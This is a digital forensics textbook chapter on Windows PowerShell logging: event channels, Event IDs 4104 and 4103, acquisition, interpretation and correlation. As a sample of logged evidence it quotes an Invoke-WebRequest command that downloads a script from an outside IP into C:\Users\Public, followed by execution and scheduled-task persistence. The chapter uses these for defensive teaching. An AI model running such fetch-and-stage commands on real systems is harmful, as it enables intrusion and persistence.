# Chapter 16: PowerShell Logging

## 1. Learning Objectives

By the end of this chapter, the reader should be able to:

- Explain why PowerShell activity appears in Windows event logs.
- Distinguish module logging, script block logging, transcription, and process creation logging.
- Identify important PowerShell event log channels and Event IDs.
- Interpret PowerShell logs without assuming full coverage.
- Correlate PowerShell evidence with scheduled tasks, services, Run keys, MFT, USN, and EDR telemetry.

## 2. Introduction

PowerShell is both an administrative tool and a common adversary tool. It can execute commands, load .NET code, download content, run scripts, manage remote systems, and automate Windows administration.

PowerShell logging can expose command content, script blocks, module activity, host starts, and operational events depending on version and configuration. Key logs include:

```text
Microsoft-Windows-PowerShell/Operational
Windows PowerShell
PowerShellCore/Operational
```

For investigators, PowerShell logs can be some of the most valuable evidence on a Windows endpoint. They may show the actual command content used to download payloads, disable security controls, create persistence, or move laterally.

Coverage is not guaranteed. Logging depends on PowerShell version, policy settings, event retention, and attacker behavior.

## 3. Why Windows Created This Artifact

PowerShell writes events so administrators and defenders can audit and troubleshoot engine, provider, and cmdlet activity. Microsoft documents that PowerShell logs internal operations from the engine, providers, and cmdlets to the Windows event log.

Group Policy can enable enhanced logging features such as module logging, script block logging, and transcription. These features exist to improve administrative visibility and security monitoring.

## 4. Why Investigators Care

Investigators care because PowerShell frequently appears in modern intrusions.

| Investigative Need | PowerShell Logging Contribution |
| --- | --- |
| Command reconstruction | Script block and module logs may reveal executed code. |
| Download analysis | Commands may expose URLs, IPs, paths, and web client use. |
| Persistence investigation | Logs may show task, service, Run key, or WMI creation commands. |
| Lateral movement | Remoting and credential-related commands may appear. |
| Obfuscation detection | Script block logging may capture deobfuscated or processed content in some cases. |
| Timeline support | Event timestamps anchor activity. |
| Attribution support | User and host fields support session correlation. |

PowerShell logs can convert a vague "PowerShell ran" finding into a precise command-level finding.

## 5. Internal Structure

Practical PowerShell logging analysis focuses on several sources.

| Source | Common Value |
| --- | --- |
| Script block logging | Event ID 4104 in `Microsoft-Windows-PowerShell/Operational`. |
| Module logging | Event ID 4103 in `Microsoft-Windows-PowerShell/Operational`. |
| Engine/provider activity | Classic `Windows PowerShell` log events. |
| Transcription | Text files written to configured transcript path. |
| Process creation | Security 4688, Sysmon 1, or EDR telemetry. |
| PowerShell 7+ | `PowerShellCore/Operational` rather than only Windows PowerShell logs. |

Important distinction:

- Event 4104 can show script block content.
- Event 4103 can show module pipeline execution details.
- Process creation logging can show `powershell.exe` or `pwsh.exe` command line.
- Transcription can capture interactive session input and output if enabled.

No single source is complete by itself.

## 6. Data Stored

PowerShell-related evidence may include:

- timestamp
- host name
- user
- process ID
- runspace ID
- pipeline ID
- script block ID
- script block text
- command invocation details
- module name
- command line
- transcript path and contents
- PowerShell host version
- severity level
- path to script file when available

Script block text may span multiple events. Reassemble multi-part events before interpreting incomplete code.

## 7. Acquisition Methods

Acquire event logs:

```text
C:\Windows\System32\winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx
C:\Windows\System32\winevt\Logs\Windows PowerShell.evtx
C:\Windows\System32\winevt\Logs\PowerShellCore%4Operational.evtx
C:\Windows\System32\winevt\Logs\Security.evtx
```

Also collect:

- transcript directories if configured
- PowerShell script files referenced in logs
- scheduled task XML
- Run keys and services
- MFT and USN records for script and payload paths
- EDR process and network telemetry

Document:

- host name
- collection time in UTC
- logs collected
- PowerShell version when available
- logging policy state if known
- transcript locations
- parser or SIEM export method
- whether source logs are local, forwarded, or SIEM-normalized

## 8. Interpretation

PowerShell interpretation must separate command content, logging coverage, and execution context.

Example observation:

```text
Event ID: 4104
Channel: Microsoft-Windows-PowerShell/Operational
ScriptBlockText: Invoke-WebRequest http://10.10.4.25/a.ps1 -OutFile C:\Users\Public\a.ps1
Time: 2026-07-14 03:12:40 UTC
```

Reasonable inference:

- PowerShell logged script block content that includes a web request command writing a script to `C:\Users\Public\a.ps1`.
- This supports a download or staging hypothesis.

Unsupported conclusion:

- "The downloaded file executed successfully."

Execution of the downloaded file requires process telemetry, subsequent script block logs, scheduled task/service evidence, Prefetch, EDR, or file system activity.

## 9. Strengths

PowerShell logs have several strengths:

- Can expose command and script content.
- Can reveal URLs, file paths, encoded commands, and suspicious functions.
- Useful for persistence, lateral movement, and download analysis.
- Event timestamps support timelines.
- Script block logging can be highly detailed when enabled.
- Correlates strongly with process creation and file system evidence.
- Forwarded logs may survive local cleanup.

PowerShell logging often provides the most readable view of attacker automation.

## 10. Weaknesses

Limitations include:

- Enhanced logging may not be enabled.
- Logs can roll over or be cleared.
- Attackers may use downgrade, unmanaged runspaces, binaries, or other bypasses.
- PowerShell 7 may log to a different channel.
- Script block content may be split across multiple events.
- Encoded or obfuscated content may require decoding and analysis.
- Logging a command does not prove every downstream effect succeeded.

PowerShell logs are strong when present, but absence must be interpreted against configuration.

## 11. Common Mistakes

### Mistake 1: Assuming 4104 Always Logs Everything

Script block logging depends on policy, version, and behavior. Verify logging configuration where possible.

### Mistake 2: Ignoring PowerShellCore

PowerShell 7+ may write to `PowerShellCore/Operational`. Querying only Windows PowerShell logs can miss activity.

### Mistake 3: Treating Encoded Commands As Unreadable

Encoded PowerShell commands can often be decoded. Preserve the original and decode safely in an analysis environment.

### Mistake 4: Ignoring Multi-Part Script Blocks

Large script blocks may be split. Interpret complete reconstructed content, not one fragment.

### Mistake 5: Treating Command Text As Completed Behavior

A logged command may fail. Correlate with action results, file creation, process telemetry, and network evidence.

## 12. Questions It Can Answer

PowerShell logs can often help answer:

- What PowerShell commands or script blocks were logged?
- Which user and host context produced the event?
- Were URLs, IP addresses, file paths, or encoded commands present?
- Was PowerShell used to create persistence?
- Was PowerShell used to download or stage files?
- Do commands align with process creation and file system evidence?

## 13. Questions It Cannot Answer

PowerShell logs cannot answer by themselves:

- Whether every PowerShell command executed on the host was logged.
- Whether a command completed successfully.
- Whether a downloaded payload was malicious.
- Whether a user intentionally ran the command.
- Whether missing logs mean PowerShell was not used.
- Whether network transfer content can be proven without network or file evidence.

## 14. Evidence Correlation

PowerShell evidence becomes strongest when combined with process, persistence, and file system artifacts.

| Correlating Artifact | Added Value |
| --- | --- |
| Security 4688 / Sysmon 1 | Process start, parent process, command line. |
| Scheduled Tasks | Persistence or automation configured by PowerShell. |
| Services | Service creation or modification commands. |
| Registry Run keys | Persistence values created or modified. |
| MFT / USN | Script, payload, archive, or output file creation. |
| Prefetch / Amcache | Execution-related and metadata context. |
| Event 4624 | User logon and session context. |
| EDR telemetry | Process lineage, remote source, network, file writes. |
| Proxy / firewall logs | Download or command-and-control destinations. |

### Correlation Map

```text
4104: PowerShell command content
        |
        +--> 4688 / EDR: parent process and command line
        |
        +--> MFT / USN: file created by command
        |
        +--> Scheduled Task / Service / Run key: persistence configured
        |
        +--> Network logs: remote host contacted
        |
        +--> Prefetch / Amcache: payload execution support
```

## 15. Investigation Walkthrough

### Scenario

A workstation reports a suspicious script created in `C:\Users\Public`.

### Step 1: Review PowerShell Operational Logs

Observation:

- Event 4104 contains `Invoke-WebRequest` writing `a.ps1` to `C:\Users\Public`.

Inference:

- PowerShell logged script content consistent with downloading or staging a script.

### Step 2: Correlate File System Evidence

Observation:

- MFT and USN show `a.ps1` created shortly after the PowerShell event.

Inference:

- File system evidence supports the command effect.

### Step 3: Check Execution

Observation:

- Event 4104 later shows `powershell.exe -File C:\Users\Public\a.ps1`.
- Security 4688 or EDR telemetry confirms PowerShell process creation.

Inference:

- Script execution is supported by logging and process telemetry.

### Step 4: Identify Persistence

Observation:

- Later PowerShell events show `schtasks /create` or COM-based task registration.
- Scheduled Task artifacts contain matching task XML.

Inference:

- PowerShell likely contributed to persistence creation.

### Step 5: Write the Finding

Precise wording:

```text
PowerShell Event 4104 records script block content that downloads a script to C:\Users\Public\a.ps1. MFT and USN records show the script file was created shortly afterward. Later PowerShell and process telemetry support execution of the script, and Scheduled Task artifacts show persistence configured after execution. These artifacts collectively support PowerShell-based staging and persistence activity.
```

## 16. ASCII Timeline

```text
03:12:40  4104: Invoke-WebRequest writes a.ps1
03:12:42  MFT / USN: a.ps1 created
03:13:05  4688 / EDR: powershell.exe executes a.ps1
03:13:06  4104: script block content from a.ps1
03:14:02  TaskScheduler 106: task registered
03:15:30  Network logs: outbound connection
```

## 17. Investigator's Mindset

PowerShell logs can feel decisive because they show readable commands. Stay disciplined: command text is evidence of logged script content, not automatic proof that every intended action succeeded.

Ask:

- Which PowerShell version and channel are involved?
- Was script block logging enabled?
- Is this a complete multi-part script block?
- Is the command encoded or obfuscated?
- What process launched PowerShell?
- Did the command create files, tasks, services, or Registry values?
- Did network logs show the remote endpoint?
- What evidence proves the command's effect?

PowerShell analysis is strongest when command text and system effects align.

## 18. Key Takeaways

- PowerShell logs can expose command and script content.
- Event 4104 is associated with script block logging; Event 4103 is associated with module logging.
- Transcription logs can capture session input and output if enabled.
- PowerShell 7+ may use `PowerShellCore/Operational`.
- Logging depends on version, policy, retention, and attacker behavior.
- A logged command does not prove every downstream effect succeeded.
- Strong findings correlate PowerShell logs with process telemetry, file system evidence, persistence artifacts, and network logs.

## 19. Review Questions

1. What is the difference between script block logging and module logging?
2. Why should investigators check `PowerShellCore/Operational`?
3. Why does a logged `Invoke-WebRequest` command not prove payload execution?
4. What artifacts would you use to confirm that a downloaded script was created and executed?
5. Why must multi-part 4104 events be reassembled?

## 20. References

- Microsoft Learn, "about_Logging_Windows": https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows
- Microsoft Learn, "about_Logging": https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging
- Microsoft Learn, "about_Group_Policy_Settings": https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings
- Splunk, "Hunting for Malicious PowerShell using Script Block Logging": https://www.splunk.com/en_us/blog/security/hunting-for-malicious-powershell-using-script-block-logging.html
- NXLog, "Logging PowerShell activity": https://docs.nxlog.co/integrations/os/powershell-activity.html
- Mandiant, "Greater Visibility Through PowerShell Logging": https://cloud.google.com/blog/topics/threat-intelligence/greater-visibility/
- MITRE ATT&CK, "PowerShell": https://attack.mitre.org/techniques/T1059/001/
